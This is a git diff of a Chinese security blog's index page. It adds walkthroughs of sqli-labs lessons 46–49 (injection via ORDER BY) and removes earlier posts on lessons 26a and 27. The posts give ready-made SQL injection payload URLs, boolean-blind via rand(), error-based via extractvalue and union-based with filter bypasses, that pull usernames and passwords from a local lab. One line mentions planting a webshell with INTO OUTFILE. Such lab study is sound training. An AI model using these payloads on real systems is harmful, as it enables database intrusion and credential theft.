@@ -64,6 +64,102 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-46" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/23/sql-labs-Less-46/" class="article-date">
+  <time datetime="2021-02-23T03:50:16.000Z" itemprop="datePublished">2021-02-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/23/sql-labs-Less-46/">sql-labs-Less-46</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/23/sql-labs-Less-46/" data-id="cklhr51790000qkux9ljjc89i" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sql-labs-Less-46~49" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/23/sql-labs-Less-46~49/" class="article-date">
+  <time datetime="2021-02-23T03:50:16.000Z" itemprop="datePublished">2021-02-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/23/sql-labs-Less-46~49/">sql-labs-Less-46~49</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-46</h1>
+
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/%EF%BC%8C%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%EF%BC%9B">http://127.0.0.1/sql/Less-46/，显示如下；</a></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/1.png" alt="1"><br>和之前的关卡有点不一样。这关我们要输入?sort=1，</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/2.png" alt="2"><br>没有什么报错信息，应该是正常输出。<br>我们输入?sort=4时，发生报错：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/3.png" alt="3"><br>显示说有未知的列，说明这可能和列有关，再分别输入?sort=2、?sirt=3：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/4.png" alt="4"><br>发现相应的列都进行了从小到大的排列。这和order by的作用很想，所以可能和order by有关。<br>再分别输入desc（从大到小排）和asc（从小到大排），如果显示结果不同，则表明可以注入。<br>我们输入?sort=1’，发生报错：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/5.png" alt="5"><br>里面只有一个’被一对’括起来，说明无注入字符。<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=3">http://127.0.0.1/sql/Less-46/?sort=3</a> and left(database(),1)=’a’，正常输出，说明不能用布尔盲注。但是可以用rand()函数进行布尔盲注。<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> union select 1，报错，说明不能用联合注入。<br>因为报错了，所以可以用报错注入，也可以用延时注入。<br><br><br>构造语句：<br>1)直接添加注入语句，?sort=(select <strong>**</strong>)<br>2)利用一些函数。例如 rand()函数等。?sort=rand(sql语句)<br>3)利用 and，例如?sort=1 and (加sql语句)</p>
+<p>这里先演示后两种：<br>2)rand()函数<br>先看一下rand的一些性质：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/23/sql-labs-Less-46~49/6.png" alt="6"><br>这里可以看到true和false的排序是不一样的，所以我们可以把盲注常用语句放到里面进行布尔盲注。<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand(left(database(),1)&gt;=0x61">http://127.0.0.1/sql/Less-46/?sort=rand(left(database(),1)&gt;=0x61</a> and left(database(),1)&lt;=0x7a)–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) &gt;= 0x61 and left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) &lt;= 0x7a)–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(left((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1) &gt;= 0x61 and left((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1) &lt;= 0x7a)–+<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(ascii(left((select id from users limit 0,1),1)) &gt;= 20 and ascii(left((select id from users limit 0,1),1)) &lt;=126)–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(ascii(left((select username from users limit 0,1),1)) &gt;= 20 and ascii(left((select username from users limit 0,1),1)) &lt;=126)–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=rand">http://127.0.0.1/sql/Less-46/?sort=rand</a>(ascii(left((select password from users limit 0,1),1)) &gt;= 20 and ascii(left((select password from users limit 0,1),1)) &lt;=126)–+</p>
+<p><code>PS：里面0x开头的是16进制，可以在hackbar里进行反转码，不要选中0x</code></p>
+<p>3)and 报错/延时<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,database()))–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’)))–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’)))–+<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select id from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> and extractvalue(1,concat(0x7e,(select password from users limit 0,1)))–+<br><br><br>还有一个procedure analyse函数能和报错注入语句一起用<br>基本格式：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-46/?sort=1">http://127.0.0.1/sql/Less-46/?sort=1</a> procedure analyse(报错注入语句,1)–+<br><br><br>也可以用into outfile导入一句话木马，然后和菜刀连接。</p>
+<h1>Less-47</h1>
+
+<p>和Less-46一样，注入字符是’，这关不知道怎么用rand函数，报错和延时还是可以用的。</p>
+<h1>Less-48</h1>
+
+<p>和Less-46一样，只不过没有报错回显了，其他方法可以用。</p>
+<h1>Less-49</h1>
+
+<p>和Less-47一样，只不过没有报错回显了，其他方法可以用。</p>
+<h1>小结</h1>
+
+<p>order by后的injection：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762732.html">https://www.cnblogs.com/lcamry/p/5762732.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/23/sql-labs-Less-46~49/" data-id="ckli29kzj0000d4ux6cef5el1" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-42~45" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/22/sql-labs-Less-42~45/" class="article-date">
@@ -443,84 +539,6 @@ https://www.cnblogs.com/lcamry/p/5762961.html
 
 
   
-    <article id="post-sql-labs-Less-27" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/17/sql-labs-Less-27/" class="article-date">
-  <time datetime="2021-02-17T05:50:11.000Z" itemprop="datePublished">2021-02-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/17/sql-labs-Less-27/">sql-labs-Less-27</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E5%86%8D%E8%BE%93%E5%85%A5&#39;%EF%BC%8C%E5%8F%91%E7%94%9F%E6%8A%A5%E9%94%99%EF%BC%8C">http://127.0.0.1/sql/Less-27/，输入?id=1，正常输出，再输入&#39;，发生报错，</a><br>从报错信息我们可以看出要用’注入，输入;%00也可以证明这一点，然后有报错信息，说明可以用报错注入。</p>
-<p>这里我们用联合注入：<br>查列数：<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> order by 3;%00，发生报错，从报错信息看出我们的空格被过滤了，<br>我们把空格换成%a0：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;%a0order%a0by%a03;%00%EF%BC%8C%E6%AD%A3%E5%B8%B8%E3%80%82">http://127.0.0.1/sql/Less-27/?id=1&#39;%a0order%a0by%a03;%00，正常。</a><br>测位置：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;union%a0select%a01,2,3;%00%EF%BC%8C%E5%8F%88%E6%8A%A5%E9%94%99%EF%BC%8C%E7%9C%8B%E4%BF%A1%E6%81%AF%E7%9F%A5%E9%81%93union%E5%92%8Cselect%E7%9A%84%E5%B0%8F%E5%86%99%E5%BD%A2%E5%BC%8F%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C">http://127.0.0.1/sql/Less-27/?id=1&#39;union%a0select%a01,2,3;%00，又报错，看信息知道union和select的小写形式被过滤了，</a><br>我们换成uNion和sElect：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,2,3;%00%EF%BC%8C%E6%AD%A3%E5%B8%B8%E3%80%82">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,2,3;%00，正常。</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,database(),3;%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00">http://127.0.0.1/sql/Less-27/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00</a></p>
-<p>报错注入：</p>
-<p>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,database())) || ‘<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))))||’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))))||’<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(group_concat(id))from(users))))||’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-27/?id=1&#39;">http://127.0.0.1/sql/Less-27/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(sElect(concat_ws(0x7e,username,passwoorrd))from(users)where(id=1))))||’</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/17/sql-labs-Less-27/" data-id="ckl93itag00003cux18oj4fhf" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql-labs-Less-26a" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/16/sql-labs-Less-26a/" class="article-date">
-  <time datetime="2021-02-16T14:58:09.000Z" itemprop="datePublished">2021-02-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/16/sql-labs-Less-26a/">sql-labs-Less-26a</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/%EF%BC%8C%E4%BB%8E%E9%A1%B5%E9%9D%A2%E4%B8%8A%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E8%B7%9FLess-26%E4%B8%80%E6%A0%B7%E6%9C%89%E4%B8%80%E4%BA%9B%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E3%80%82">http://127.0.0.1/sql/Less-26a/，从页面上可以看到跟Less-26一样有一些字符被过滤了。</a><br>输入?id=1,正常，在输入’，出现错误且没有回显，说明不能用报错注入了，可以用联合注入和延时注入。<br>再输入’，正常输出，但注入字符并不是’而是’)，因为输入’);%00正常输出。<br>接下来就是用联合注入法了，记得把空格换成%a0。</p>
-<p>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0oorrder%a0by%a03;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0oorrder%a0by%a03;%00</a><br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,2,3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,2,3;%00</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,database(),3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/16/sql-labs-Less-26a/" data-id="ckl85tp9k0000igux7bn551xl" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -557,6 +575,14 @@ https://www.cnblogs.com/lcamry/p/5762961.html
       <ul>
         
           <li>
+            <a href="/2021/02/23/sql-labs-Less-46/">sql-labs-Less-46</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/23/sql-labs-Less-46~49/">sql-labs-Less-46~49</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/22/sql-labs-Less-42~45/">sql-labs-Less-42~45</a>
           </li>
         
@@ -566,14 +592,6 @@ https://www.cnblogs.com/lcamry/p/5762961.html
         
           <li>
             <a href="/2021/02/21/sql-labs-Less-36-37/">sql-labs-Less-36~37</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/20/sql-labs-Less-34/">sql-labs-Less-34</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/20/sql-labs-Less-32~33-35/">sql-labs-Less-32~33-35</a>
           </li>
         
       </ul>
